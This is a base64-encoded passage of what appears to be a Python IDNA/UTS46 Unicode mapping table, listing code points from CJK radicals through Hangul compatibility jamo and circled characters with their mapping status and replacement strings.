MkZDRCwgXCdNXCcsIFwnXHhlOVx4YmNceDhlXCcpLFxuICAgICgweDJGQ0UsIFwnTVwnLCBcJ1x4ZTlceGJjXHg5M1wnKSxcbiAgICAoMHgyRkNGLCBcJ01cJywgXCdceGU5XHhiY1x4YTBcJyksXG4gICAgKDB4MkZEMCwgXCdNXCcsIFwnXHhlOVx4YmNceGJiXCcpLFxuICAgICgweDJGRDEsIFwnTVwnLCBcJ1x4ZTlceGJkXHg4YVwnKSxcbiAgICAoMHgyRkQyLCBcJ01cJywgXCdceGU5XHhiZFx4OTJcJyksXG4gICAgKDB4MkZEMywgXCdNXCcsIFwnXHhlOVx4YmVceDhkXCcpLFxuICAgICgweDJGRDQsIFwnTVwnLCBcJ1x4ZTlceGJlXHg5Y1wnKSxcbiAgICAoMHgyRkQ1LCBcJ01cJywgXCdceGU5XHhiZVx4YTBcJyksXG4gICAgKDB4MkZENiwgXCdYXCcpLFxuICAgICgweDMwMDAsIFwnM1wnLCBcJyBcJyksXG4gICAgKDB4MzAwMSwgXCdWXCcpLFxuICAgICgweDMwMDIsIFwnTVwnLCBcJy5cJyksXG4gICAgKDB4MzAwMywgXCdWXCcpLFxuICAgICgweDMwMzYsIFwnTVwnLCBcJ1x4ZTNceDgwXHg5MlwnKSxcbiAgICAoMHgzMDM3LCBcJ1ZcJyksXG4gICAgKDB4MzAzOCwgXCdNXCcsIFwnXHhlNVx4OGRceDgxXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMjkoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDMwMzksIFwnTVwnLCBcJ1x4ZTVceDhkXHg4NFwnKSxcbiAgICAoMHgzMDNBLCBcJ01cJywgXCdceGU1XHg4ZFx4ODVcJyksXG4gICAgKDB4MzAzQiwgXCdWXCcpLFxuICAgICgweDMwNDAsIFwnWFwnKSxcbiAgICAoMHgzMDQxLCBcJ1ZcJyksXG4gICAgKDB4MzA5NywgXCdYXCcpLFxuICAgICgweDMwOTksIFwnVlwnKSxcbiAgICAoMHgzMDlCLCBcJzNcJywgXCcgXHhlM1x4ODJceDk5XCcpLFxuICAgICgweDMwOUMsIFwnM1wnLCBcJyBceGUzXHg4Mlx4OWFcJyksXG4gICAgKDB4MzA5RCwgXCdWXCcpLFxuICAgICgweDMwOUYsIFwnTVwnLCBcJ1x4ZTNceDgyXHg4OFx4ZTNceDgyXHg4YVwnKSxcbiAgICAoMHgzMEEwLCBcJ1ZcJyksXG4gICAgKDB4MzBGRiwgXCdNXCcsIFwnXHhlM1x4ODJceGIzXHhlM1x4ODNceDg4XCcpLFxuICAgICgweDMxMDAsIFwnWFwnKSxcbiAgICAoMHgzMTA1LCBcJ1ZcJyksXG4gICAgKDB4MzEzMCwgXCdYXCcpLFxuICAgICgweDMxMzEsIFwnTVwnLCBcJ1x4ZTFceDg0XHg4MFwnKSxcbiAgICAoMHgzMTMyLCBcJ01cJywgXCdceGUxXHg4NFx4ODFcJyksXG4gICAgKDB4MzEzMywgXCdNXCcsIFwnXHhlMVx4ODZceGFhXCcpLFxuICAgICgweDMxMzQsIFwnTVwnLCBcJ1x4ZTFceDg0XHg4MlwnKSxcbiAgICAoMHgzMTM1LCBcJ01cJywgXCdceGUxXHg4Nlx4YWNcJyksXG4gICAgKDB4MzEzNiwgXCdNXCcsIFwnXHhlMVx4ODZceGFkXCcpLFxuICAgICgweDMxMzcsIFwnTVwnLCBcJ1x4ZTFceDg0XHg4M1wnKSxcbiAgICAoMHgzMTM4LCBcJ01cJywgXCdceGUxXHg4NFx4ODRcJyksXG4gICAgKDB4MzEzOSwgXCdNXCcsIFwnXHhlMVx4ODRceDg1XCcpLFxuICAgICgweDMxM0EsIFwnTVwnLCBcJ1x4ZTFceDg2XHhiMFwnKSxcbiAgICAoMHgzMTNCLCBcJ01cJywgXCdceGUxXHg4Nlx4YjFcJyksXG4gICAgKDB4MzEzQywgXCdNXCcsIFwnXHhlMVx4ODZceGIyXCcpLFxuICAgICgweDMxM0QsIFwnTVwnLCBcJ1x4ZTFceDg2XHhiM1wnKSxcbiAgICAoMHgzMTNFLCBcJ01cJywgXCdceGUxXHg4Nlx4YjRcJyksXG4gICAgKDB4MzEzRiwgXCdNXCcsIFwnXHhlMVx4ODZceGI1XCcpLFxuICAgICgweDMxNDAsIFwnTVwnLCBcJ1x4ZTFceDg0XHg5YVwnKSxcbiAgICAoMHgzMTQxLCBcJ01cJywgXCdceGUxXHg4NFx4ODZcJyksXG4gICAgKDB4MzE0MiwgXCdNXCcsIFwnXHhlMVx4ODRceDg3XCcpLFxuICAgICgweDMxNDMsIFwnTVwnLCBcJ1x4ZTFceDg0XHg4OFwnKSxcbiAgICAoMHgzMTQ0LCBcJ01cJywgXCdceGUxXHg4NFx4YTFcJyksXG4gICAgKDB4MzE0NSwgXCdNXCcsIFwnXHhlMVx4ODRceDg5XCcpLFxuICAgICgweDMxNDYsIFwnTVwnLCBcJ1x4ZTFceDg0XHg4YVwnKSxcbiAgICAoMHgzMTQ3LCBcJ01cJywgXCdceGUxXHg4NFx4OGJcJyksXG4gICAgKDB4MzE0OCwgXCdNXCcsIFwnXHhlMVx4ODRceDhjXCcpLFxuICAgICgweDMxNDksIFwnTVwnLCBcJ1x4ZTFceDg0XHg4ZFwnKSxcbiAgICAoMHgzMTRBLCBcJ01cJywgXCdceGUxXHg4NFx4OGVcJyksXG4gICAgKDB4MzE0QiwgXCdNXCcsIFwnXHhlMVx4ODRceDhmXCcpLFxuICAgICgweDMxNEMsIFwnTVwnLCBcJ1x4ZTFceDg0XHg5MFwnKSxcbiAgICAoMHgzMTRELCBcJ01cJywgXCdceGUxXHg4NFx4OTFcJyksXG4gICAgKDB4MzE0RSwgXCdNXCcsIFwnXHhlMVx4ODRceDkyXCcpLFxuICAgICgweDMxNEYsIFwnTVwnLCBcJ1x4ZTFceDg1XHhhMVwnKSxcbiAgICAoMHgzMTUwLCBcJ01cJywgXCdceGUxXHg4NVx4YTJcJyksXG4gICAgKDB4MzE1MSwgXCdNXCcsIFwnXHhlMVx4ODVceGEzXCcpLFxuICAgICgweDMxNTIsIFwnTVwnLCBcJ1x4ZTFceDg1XHhhNFwnKSxcbiAgICAoMHgzMTUzLCBcJ01cJywgXCdceGUxXHg4NVx4YTVcJyksXG4gICAgKDB4MzE1NCwgXCdNXCcsIFwnXHhlMVx4ODVceGE2XCcpLFxuICAgICgweDMxNTUsIFwnTVwnLCBcJ1x4ZTFceDg1XHhhN1wnKSxcbiAgICAoMHgzMTU2LCBcJ01cJywgXCdceGUxXHg4NVx4YThcJyksXG4gICAgKDB4MzE1NywgXCdNXCcsIFwnXHhlMVx4ODVceGE5XCcpLFxuICAgICgweDMxNTgsIFwnTVwnLCBcJ1x4ZTFceDg1XHhhYVwnKSxcbiAgICAoMHgzMTU5LCBcJ01cJywgXCdceGUxXHg4NVx4YWJcJyksXG4gICAgKDB4MzE1QSwgXCdNXCcsIFwnXHhlMVx4ODVceGFjXCcpLFxuICAgICgweDMxNUIsIFwnTVwnLCBcJ1x4ZTFceDg1XHhhZFwnKSxcbiAgICAoMHgzMTVDLCBcJ01cJywgXCdceGUxXHg4NVx4YWVcJyksXG4gICAgKDB4MzE1RCwgXCdNXCcsIFwnXHhlMVx4ODVceGFmXCcpLFxuICAgICgweDMxNUUsIFwnTVwnLCBcJ1x4ZTFceDg1XHhiMFwnKSxcbiAgICAoMHgzMTVGLCBcJ01cJywgXCdceGUxXHg4NVx4YjFcJyksXG4gICAgKDB4MzE2MCwgXCdNXCcsIFwnXHhlMVx4ODVceGIyXCcpLFxuICAgICgweDMxNjEsIFwnTVwnLCBcJ1x4ZTFceDg1XHhiM1wnKSxcbiAgICAoMHgzMTYyLCBcJ01cJywgXCdceGUxXHg4NVx4YjRcJyksXG4gICAgKDB4MzE2MywgXCdNXCcsIFwnXHhlMVx4ODVceGI1XCcpLFxuICAgICgweDMxNjQsIFwnWFwnKSxcbiAgICAoMHgzMTY1LCBcJ01cJywgXCdceGUxXHg4NFx4OTRcJyksXG4gICAgKDB4MzE2NiwgXCdNXCcsIFwnXHhlMVx4ODRceDk1XCcpLFxuICAgICgweDMxNjcsIFwnTVwnLCBcJ1x4ZTFceDg3XHg4N1wnKSxcbiAgICAoMHgzMTY4LCBcJ01cJywgXCdceGUxXHg4N1x4ODhcJyksXG4gICAgKDB4MzE2OSwgXCdNXCcsIFwnXHhlMVx4ODdceDhjXCcpLFxuICAgICgweDMxNkEsIFwnTVwnLCBcJ1x4ZTFceDg3XHg4ZVwnKSxcbiAgICAoMHgzMTZCLCBcJ01cJywgXCdceGUxXHg4N1x4OTNcJyksXG4gICAgKDB4MzE2QywgXCdNXCcsIFwnXHhlMVx4ODdceDk3XCcpLFxuICAgICgweDMxNkQsIFwnTVwnLCBcJ1x4ZTFceDg3XHg5OVwnKSxcbiAgICAoMHgzMTZFLCBcJ01cJywgXCdceGUxXHg4NFx4OWNcJyksXG4gICAgKDB4MzE2RiwgXCdNXCcsIFwnXHhlMVx4ODdceDlkXCcpLFxuICAgICgweDMxNzAsIFwnTVwnLCBcJ1x4ZTFceDg3XHg5ZlwnKSxcbiAgICAoMHgzMTcxLCBcJ01cJywgXCdceGUxXHg4NFx4OWRcJyksXG4gICAgKDB4MzE3MiwgXCdNXCcsIFwnXHhlMVx4ODRceDllXCcpLFxuICAgICgweDMxNzMsIFwnTVwnLCBcJ1x4ZTFceDg0XHhhMFwnKSxcbiAgICAoMHgzMTc0LCBcJ01cJywgXCdceGUxXHg4NFx4YTJcJyksXG4gICAgKDB4MzE3NSwgXCdNXCcsIFwnXHhlMVx4ODRceGEzXCcpLFxuICAgICgweDMxNzYsIFwnTVwnLCBcJ1x4ZTFceDg0XHhhN1wnKSxcbiAgICAoMHgzMTc3LCBcJ01cJywgXCdceGUxXHg4NFx4YTlcJyksXG4gICAgKDB4MzE3OCwgXCdNXCcsIFwnXHhlMVx4ODRceGFiXCcpLFxuICAgICgweDMxNzksIFwnTVwnLCBcJ1x4ZTFceDg0XHhhY1wnKSxcbiAgICAoMHgzMTdBLCBcJ01cJywgXCdceGUxXHg4NFx4YWRcJyksXG4gICAgKDB4MzE3QiwgXCdNXCcsIFwnXHhlMVx4ODRceGFlXCcpLFxuICAgICgweDMxN0MsIFwnTVwnLCBcJ1x4ZTFceDg0XHhhZlwnKSxcbiAgICAoMHgzMTdELCBcJ01cJywgXCdceGUxXHg4NFx4YjJcJyksXG4gICAgKDB4MzE3RSwgXCdNXCcsIFwnXHhlMVx4ODRceGI2XCcpLFxuICAgICgweDMxN0YsIFwnTVwnLCBcJ1x4ZTFceDg1XHg4MFwnKSxcbiAgICAoMHgzMTgwLCBcJ01cJywgXCdceGUxXHg4NVx4ODdcJyksXG4gICAgKDB4MzE4MSwgXCdNXCcsIFwnXHhlMVx4ODVceDhjXCcpLFxuICAgICgweDMxODIsIFwnTVwnLCBcJ1x4ZTFceDg3XHhiMVwnKSxcbiAgICAoMHgzMTgzLCBcJ01cJywgXCdceGUxXHg4N1x4YjJcJyksXG4gICAgKDB4MzE4NCwgXCdNXCcsIFwnXHhlMVx4ODVceDk3XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMzAoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDMxODUsIFwnTVwnLCBcJ1x4ZTFceDg1XHg5OFwnKSxcbiAgICAoMHgzMTg2LCBcJ01cJywgXCdceGUxXHg4NVx4OTlcJyksXG4gICAgKDB4MzE4NywgXCdNXCcsIFwnXHhlMVx4ODZceDg0XCcpLFxuICAgICgweDMxODgsIFwnTVwnLCBcJ1x4ZTFceDg2XHg4NVwnKSxcbiAgICAoMHgzMTg5LCBcJ01cJywgXCdceGUxXHg4Nlx4ODhcJyksXG4gICAgKDB4MzE4QSwgXCdNXCcsIFwnXHhlMVx4ODZceDkxXCcpLFxuICAgICgweDMxOEIsIFwnTVwnLCBcJ1x4ZTFceDg2XHg5MlwnKSxcbiAgICAoMHgzMThDLCBcJ01cJywgXCdceGUxXHg4Nlx4OTRcJyksXG4gICAgKDB4MzE4RCwgXCdNXCcsIFwnXHhlMVx4ODZceDllXCcpLFxuICAgICgweDMxOEUsIFwnTVwnLCBcJ1x4ZTFceDg2XHhhMVwnKSxcbiAgICAoMHgzMThGLCBcJ1hcJyksXG4gICAgKDB4MzE5MCwgXCdWXCcpLFxuICAgICgweDMxOTIsIFwnTVwnLCBcJ1x4ZTRceGI4XHg4MFwnKSxcbiAgICAoMHgzMTkzLCBcJ01cJywgXCdceGU0XHhiYVx4OGNcJyksXG4gICAgKDB4MzE5NCwgXCdNXCcsIFwnXHhlNFx4YjhceDg5XCcpLFxuICAgICgweDMxOTUsIFwnTVwnLCBcJ1x4ZTVceDliXHg5YlwnKSxcbiAgICAoMHgzMTk2LCBcJ01cJywgXCdceGU0XHhiOFx4OGFcJyksXG4gICAgKDB4MzE5NywgXCdNXCcsIFwnXHhlNFx4YjhceGFkXCcpLFxuICAgICgweDMxOTgsIFwnTVwnLCBcJ1x4ZTRceGI4XHg4YlwnKSxcbiAgICAoMHgzMTk5LCBcJ01cJywgXCdceGU3XHg5NFx4YjJcJyksXG4gICAgKDB4MzE5QSwgXCdNXCcsIFwnXHhlNFx4YjlceDk5XCcpLFxuICAgICgweDMxOUIsIFwnTVwnLCBcJ1x4ZTRceGI4XHg5OVwnKSxcbiAgICAoMHgzMTlDLCBcJ01cJywgXCdceGU0XHhiOFx4ODFcJyksXG4gICAgKDB4MzE5RCwgXCdNXCcsIFwnXHhlNVx4YTRceGE5XCcpLFxuICAgICgweDMxOUUsIFwnTVwnLCBcJ1x4ZTVceDljXHhiMFwnKSxcbiAgICAoMHgzMTlGLCBcJ01cJywgXCdceGU0XHhiYVx4YmFcJyksXG4gICAgKDB4MzFBMCwgXCdWXCcpLFxuICAgICgweDMxRTQsIFwnWFwnKSxcbiAgICAoMHgzMUYwLCBcJ1ZcJyksXG4gICAgKDB4MzIwMCwgXCczXCcsIFwnKFx4ZTFceDg0XHg4MClcJyksXG4gICAgKDB4MzIwMSwgXCczXCcsIFwnKFx4ZTFceDg0XHg4MilcJyksXG4gICAgKDB4MzIwMiwgXCczXCcsIFwnKFx4ZTFceDg0XHg4MylcJyksXG4gICAgKDB4MzIwMywgXCczXCcsIFwnKFx4ZTFceDg0XHg4NSlcJyksXG4gICAgKDB4MzIwNCwgXCczXCcsIFwnKFx4ZTFceDg0XHg4NilcJyksXG4gICAgKDB4MzIwNSwgXCczXCcsIFwnKFx4ZTFceDg0XHg4NylcJyksXG4gICAgKDB4MzIwNiwgXCczXCcsIFwnKFx4ZTFceDg0XHg4OSlcJyksXG4gICAgKDB4MzIwNywgXCczXCcsIFwnKFx4ZTFceDg0XHg4YilcJyksXG4gICAgKDB4MzIwOCwgXCczXCcsIFwnKFx4ZTFceDg0XHg4YylcJyksXG4gICAgKDB4MzIwOSwgXCczXCcsIFwnKFx4ZTFceDg0XHg4ZSlcJyksXG4gICAgKDB4MzIwQSwgXCczXCcsIFwnKFx4ZTFceDg0XHg4ZilcJyksXG4gICAgKDB4MzIwQiwgXCczXCcsIFwnKFx4ZTFceDg0XHg5MClcJyksXG4gICAgKDB4MzIwQywgXCczXCcsIFwnKFx4ZTFceDg0XHg5MSlcJyksXG4gICAgKDB4MzIwRCwgXCczXCcsIFwnKFx4ZTFceDg0XHg5MilcJyksXG4gICAgKDB4MzIwRSwgXCczXCcsIFwnKFx4ZWFceGIwXHg4MClcJyksXG4gICAgKDB4MzIwRiwgXCczXCcsIFwnKFx4ZWJceDgyXHg5OClcJyksXG4gICAgKDB4MzIxMCwgXCczXCcsIFwnKFx4ZWJceDhiXHhhNClcJyksXG4gICAgKDB4MzIxMSwgXCczXCcsIFwnKFx4ZWJceDlkXHhiYylcJyksXG4gICAgKDB4MzIxMiwgXCczXCcsIFwnKFx4ZWJceGE3XHg4OClcJyksXG4gICAgKDB4MzIxMywgXCczXCcsIFwnKFx4ZWJceGIwXHg5NClcJyksXG4gICAgKDB4MzIxNCwgXCczXCcsIFwnKFx4ZWNceDgyXHhhYylcJyksXG4gICAgKDB4MzIxNSwgXCczXCcsIFwnKFx4ZWNceDk1XHg4NClcJyksXG4gICAgKDB4MzIxNiwgXCczXCcsIFwnKFx4ZWNceDllXHg5MClcJyksXG4gICAgKDB4MzIxNywgXCczXCcsIFwnKFx4ZWNceGIwXHhhOClcJyksXG4gICAgKDB4MzIxOCwgXCczXCcsIFwnKFx4ZWNceGI5XHhiNClcJyksXG4gICAgKDB4MzIxOSwgXCczXCcsIFwnKFx4ZWRceDgzXHg4MClcJyksXG4gICAgKDB4MzIxQSwgXCczXCcsIFwnKFx4ZWRceDhjXHg4YylcJyksXG4gICAgKDB4MzIxQiwgXCczXCcsIFwnKFx4ZWRceDk1XHg5OClcJyksXG4gICAgKDB4MzIxQywgXCczXCcsIFwnKFx4ZWNceGEzXHhiYylcJyksXG4gICAgKDB4MzIxRCwgXCczXCcsIFwnKFx4ZWNceDk4XHhhNFx4ZWNceGEwXHg4NClcJyksXG4gICAgKDB4MzIxRSwgXCczXCcsIFwnKFx4ZWNceDk4XHhhNFx4ZWRceDliXHg4NClcJyksXG4gICAgKDB4MzIxRiwgXCdYXCcpLFxuICAgICgweDMyMjAsIFwnM1wnLCBcJyhceGU0XHhiOFx4ODApXCcpLFxuICAgICgweDMyMjEsIFwnM1wnLCBcJyhceGU0XHhiYVx4OGMpXCcpLFxuICAgICgweDMyMjIsIFwnM1wnLCBcJyhceGU0XHhiOFx4ODkpXCcpLFxuICAgICgweDMyMjMsIFwnM1wnLCBcJyhceGU1XHg5Ylx4OWIpXCcpLFxuICAgICgweDMyMjQsIFwnM1wnLCBcJyhceGU0XHhiYVx4OTQpXCcpLFxuICAgICgweDMyMjUsIFwnM1wnLCBcJyhceGU1XHg4NVx4YWQpXCcpLFxuICAgICgweDMyMjYsIFwnM1wnLCBcJyhceGU0XHhiOFx4ODMpXCcpLFxuICAgICgweDMyMjcsIFwnM1wnLCBcJyhceGU1XHg4NVx4YWIpXCcpLFxuICAgICgweDMyMjgsIFwnM1wnLCBcJyhceGU0XHhiOVx4OWQpXCcpLFxuICAgICgweDMyMjksIFwnM1wnLCBcJyhceGU1XHg4ZFx4ODEpXCcpLFxuICAgICgweDMyMkEsIFwnM1wnLCBcJyhceGU2XHg5Y1x4ODgpXCcpLFxuICAgICgweDMyMkIsIFwnM1wnLCBcJyhceGU3XHg4MVx4YWIpXCcpLFxuICAgICgweDMyMkMsIFwnM1wnLCBcJyhceGU2XHhiMFx4YjQpXCcpLFxuICAgICgweDMyMkQsIFwnM1wnLCBcJyhceGU2XHg5Y1x4YTgpXCcpLFxuICAgICgweDMyMkUsIFwnM1wnLCBcJyhceGU5XHg4N1x4OTEpXCcpLFxuICAgICgweDMyMkYsIFwnM1wnLCBcJyhceGU1XHg5Y1x4OWYpXCcpLFxuICAgICgweDMyMzAsIFwnM1wnLCBcJyhceGU2XHg5N1x4YTUpXCcpLFxuICAgICgweDMyMzEsIFwnM1wnLCBcJyhceGU2XHhhMFx4YWEpXCcpLFxuICAgICgweDMyMzIsIFwnM1wnLCBcJyhceGU2XHg5Y1x4ODkpXCcpLFxuICAgICgweDMyMzMsIFwnM1wnLCBcJyhceGU3XHhhNFx4YmUpXCcpLFxuICAgICgweDMyMzQsIFwnM1wnLCBcJyhceGU1XHg5MFx4OGQpXCcpLFxuICAgICgweDMyMzUsIFwnM1wnLCBcJyhceGU3XHg4OVx4YjkpXCcpLFxuICAgICgweDMyMzYsIFwnM1wnLCBcJyhceGU4XHhiMlx4YTEpXCcpLFxuICAgICgweDMyMzcsIFwnM1wnLCBcJyhceGU3XHhhNVx4OWQpXCcpLFxuICAgICgweDMyMzgsIFwnM1wnLCBcJyhceGU1XHg4YVx4YjQpXCcpLFxuICAgICgweDMyMzksIFwnM1wnLCBcJyhceGU0XHhiYlx4YTMpXCcpLFxuICAgICgweDMyM0EsIFwnM1wnLCBcJyhceGU1XHg5MVx4YmMpXCcpLFxuICAgICgweDMyM0IsIFwnM1wnLCBcJyhceGU1XHhhZFx4YTYpXCcpLFxuICAgICgweDMyM0MsIFwnM1wnLCBcJyhceGU3XHg5Ylx4YTMpXCcpLFxuICAgICgweDMyM0QsIFwnM1wnLCBcJyhceGU0XHhiY1x4ODEpXCcpLFxuICAgICgweDMyM0UsIFwnM1wnLCBcJyhceGU4XHhiM1x4ODcpXCcpLFxuICAgICgweDMyM0YsIFwnM1wnLCBcJyhceGU1XHg4ZFx4OTQpXCcpLFxuICAgICgweDMyNDAsIFwnM1wnLCBcJyhceGU3XHhhNVx4YWQpXCcpLFxuICAgICgweDMyNDEsIFwnM1wnLCBcJyhceGU0XHhiY1x4OTEpXCcpLFxuICAgICgweDMyNDIsIFwnM1wnLCBcJyhceGU4XHg4N1x4YWEpXCcpLFxuICAgICgweDMyNDMsIFwnM1wnLCBcJyhceGU4XHg4N1x4YjMpXCcpLFxuICAgICgweDMyNDQsIFwnTVwnLCBcJ1x4ZTVceDk1XHg4ZlwnKSxcbiAgICAoMHgzMjQ1LCBcJ01cJywgXCdceGU1XHhiOVx4YmNcJyksXG4gICAgKDB4MzI0NiwgXCdNXCcsIFwnXHhlNlx4OTZceDg3XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMzEoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDMyNDcsIFwnTVwnLCBcJ1x4ZTdceGFlXHg4ZlwnKSxcbiAgICAoMHgzMjQ4LCBcJ1ZcJyksXG4gICAgKDB4MzI1MCwgXCdNXCcsIFwncHRlXCcpLFxuICAgICgweDMyNTEsIFwnTVwnLCBcJzIxXCcpLFxuICAgICgweDMyNTIsIFwnTVwnLCBcJzIyXCcpLFxuICAgICgweDMyNTMsIFwnTVwnLCBcJzIzXCcpLFxuICAgICgweDMyNTQsIFwnTVwnLCBcJzI0XCcpLFxuICAgICgweDMyNTUsIFwnTVwnLCBcJzI1XCcpLFxuICAgICgweDMyNTYsIFwnTVwnLCBcJzI2XCcpLFxuICAgICgweDMyNTcsIFwnTVwnLCBcJzI3XCcpLFxuICAgICgweDMyNTgsIFwnTVwnLCBcJzI4XCcpLFxuICAgICgweDMyNTksIFwnTVwnLCBcJzI5XCcpLFxuICAgICgweDMyNUEsIFwnTVwnLCBcJzMwXCcpLFxuICAgICgweDMyNUIsIFwnTVwnLCBcJzMxXCcpLFxuICAgICgweDMyNUMsIFwnTVwnLCBcJzMyXCcpLFxuICAgICgweDMyNUQsIFwnTVwnLCBcJzMzXCcpLFxuICAgICgweDMyNUUsIFwnTVwnLCBcJzM0XCcpLFxuICAgICgweDMyNUYsIFwnTVwnLCBcJzM1XCcpLFxuICAgICgweDMyNjAsIFwnTVwnLCBcJ1x4ZTFceDg0XHg4MFwnKSxcbiAgICAoMHgzMjYxLCBcJ01cJywgXCdceGUxXHg4NFx4ODJcJyksXG4gICAgKDB4MzI2MiwgXCdNXCcsIFwnXHhlMVx4ODRceDgzXCcpLFxuICAgICgweDMyNjMsIFwnTVwnLCBcJ1x4ZTFceDg0XHg4NVwnKSxcbiAgICAoMHgzMjY0LCBcJ01cJywgXCdceGUxXHg4NFx4ODZcJyksXG4gICAgKDB4MzI2NSwgXCdNXCcsIFwnXHhlMVx4ODRceDg3XCcpLFxuICAgICgweDMyNjYsIFwnTVwnLCBcJ1x4ZTFceDg0XHg4OVwnKSxcbiAgICAoMHgzMjY3LCBcJ01cJywgXCdceGUxXHg4NFx4OGJcJyksXG4gICAgKDB4MzI2OCwgXCdNXCcsIFwnXHhlMVx4ODRceDhjXCcpLFxuICAgICgweDMyNjksIFwnTVwnLCBcJ1x4ZTFceDg0XHg4ZVwnKSxcbiAgICAoMHgzMjZBLCBcJ01cJywgXCdceGUxXHg4NFx4OGZcJyksXG4gICAgKDB4MzI2QiwgXCdNXCcsIFwnXHhlMVx4ODRceDkwXCcpLFxuICAgICgweDMyNkMsIFwnTVwnLCBcJ1x4ZTFceDg0XHg5MVwnKSxcbiAgICAoMHgzMjZELCBcJ01cJywgXCdceGUxXHg4NFx4OTJcJyksXG4gICAgKDB4MzI2RSwgXCdNXCcsIFwnXHhlYVx4YjBceDgwXCcpLFxuICAgICgweDMyNkYsIFwnTVwnLCBcJ1x4ZWJceDgyXHg5OFwnKSxcbiAgICAoMHgzMjcwLCBcJ01cJywgXCdceGViXHg4Ylx4YTRcJyksXG4gICAgKDB4MzI3MSwgXCdNXCcsIFwnXHhlYlx4OWRceGJjXCcpLFxuICAgICgweDMyNzIsIFwnTVwnLCBcJ1x4ZWJceGE3XHg4OFwnKSxcbiAgICAoMHgzMjczLCBcJ01cJywgXCdceGViXHhiMFx4OTRcJyksXG4gICAgKDB4MzI3NCwgXCdNXCcsIFwnXHhlY1x4ODJceGFjXCcpLFxuICAgICgweDMyNzUsIFwnTVwnLCBcJ1x4ZWNceDk1XHg4NFwnKSxcbiAgICAoMHgzMjc2LCBcJ01cJywgXCdceGVjXHg5ZVx4OTBcJyksXG4gICAgKDB4MzI3NywgXCdNXCcsIFwnXHhlY1x4YjBceGE4XCcpLFxuICAgICgweDMyNzgsIFwnTVwnLCBcJ1x4ZWNceGI5XHhiNFwnKSxcbiAgICAoMHgzMjc5LCBcJ01cJywgXCdceGVkXHg4M1x4ODBcJyksXG4gICAgKDB4MzI3QSwgXCdNXCcsIFwnXHhlZFx4OGNceDhjXCcpLFxuICAgICgweDMyN0IsIFwnTVwnLCBcJ1x4ZWRceDk1XHg5OFwnKSxcbiAgICAoMHgzMjdDLCBcJ01cJywgXCdceGVjXHhiMFx4YjhceGVhXHhiM1x4YTBcJyksXG4gICAgKDB4MzI3RCwgXCdNXCcsIFwnXHhlY1x4YTNceGJjXHhlY1x4OWRceDk4XCcpLFxuICAgICgweDMyN0UsIFwnTVwnLCBcJ1x4ZWNceDlhXHhiMFwnKSxcbiAgICAoMHgzMjdGLCBcJ1ZcJyksXG4gICAgKDB4MzI4MCwgXCdNXCcsIFwnXHhlNFx4YjhceDgwXCcpLFxuICAgICgweDMyODEsIFwnTVwnLCBcJ1x4ZTRceGJhXHg4Y1wnKSxcbiAgICAoMHgzMjgyLCBcJ01cJywgXCdceGU0XHhiOFx4ODlcJyksXG4gICAgKDB4MzI4MywgXCdNXCcsIFwnXHhlNVx4OWJceDliXCcpLFxuICAgICgweDMyODQsIFwnTVwnLCBcJ1x4ZTRceGJhXHg5NFwnKSxcbiAgICAoMHgzMjg1LCBcJ01cJywgXCdceGU1XHg4NVx4YWRcJyksXG4gICAgKDB4MzI4NiwgXCdNXCcsIFwnXHhlNFx4YjhceDgzXCcpLFxuICAgICgweDMyODcsIFwnTVwnLCBcJ1x4ZTVceDg1XHhhYlwnKSxcbiAgICAoMHgzMjg4LCBcJ01cJywgXCdceGU0XHhiOVx4OWRcJyksXG4gICAgKDB4MzI4OSwgXCdNXCcsIFwnXHhlNVx4OGRceDgxXCcpLFxuICAgICgweDMyOEEsIFwnTVwnLCBcJ1x4ZTZceDljXHg4OFwnKSxcbiAgICAoMHgzMjhCLCBcJ01cJywgXCdceGU3XHg4MVx4YWJcJyksXG4gICAgKDB4MzI4QywgXCdNXCcsIFwnXHhlNlx4YjBceGI0XCcpLFxuICAgICgweDMyOEQsIFwnTVwnLCBcJ1x4ZTZceDljXHhhOFwnKSxcbiAgICAoMHgzMjhFLCBcJ01cJywgXCdceGU5XHg4N1x4OTFcJyksXG4gICAgKDB4MzI4RiwgXCdNXCcsIFwnXHhlNVx4OWNceDlmXCcpLFxuICAgICgweDMyOTAsIFwnTVwnLCBcJ1x4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzMjkxLCBcJ01cJywgXCdceGU2XHhhMFx4YWFcJyksXG4gICAgKDB4MzI5MiwgXCdNXCcsIFwnXHhlNlx4OWNceDg5XCcpLFxuICAgICgweDMyOTMsIFwnTVwnLCBcJ1x4ZTdceGE0XHhiZVwnKSxcbiAgICAoMHgzMjk0LCBcJ01cJywgXCdceGU1XHg5MFx4OGRcJyksXG4gICAgKDB4MzI5NSwgXCdNXCcsIFwnXHhlN1x4ODlceGI5XCcpLFxuICAgICgweDMyOTYsIFwnTVwnLCBcJ1x4ZThceGIyXHhhMVwnKSxcbiAgICAoMHgzMjk3LCBcJ01cJywgXCdceGU3XHhhNVx4OWRcJyksXG4gICAgKDB4MzI5OCwgXCdNXCcsIFwnXHhlNVx4OGFceGI0XCcpLFxuICAgICgweDMyOTksIFwnTVwnLCBcJ1x4ZTdceGE3XHg5OFwnKSxcbiAgICAoMHgzMjlBLCBcJ01cJywgXCdceGU3XHg5NFx4YjdcJyksXG4gICAgKDB4MzI5QiwgXCdNXCcsIFwnXHhlNVx4YTVceGIzXCcpLFxuICAgICgweDMyOUMsIFwnTVwnLCBcJ1x4ZTlceDgxXHhhOVwnKSxcbiAgICAoMHgzMjlELCBcJ01cJywgXCdceGU1XHg4NFx4YWFcJyksXG4gICAgKDB4MzI5RSwgXCdNXCcsIFwnXHhlNVx4OGRceGIwXCcpLFxuICAgICgweDMyOUYsIFwnTVwnLCBcJ1x4ZTZceGIzXHhhOFwnKSxcbiAgICAoMHgzMkEwLCBcJ01cJywgXCdceGU5XHhhMFx4ODVcJyksXG4gICAgKDB4MzJBMSwgXCdNXCcsIFwnXHhlNFx4YmNceDkxXCcpLFxuIC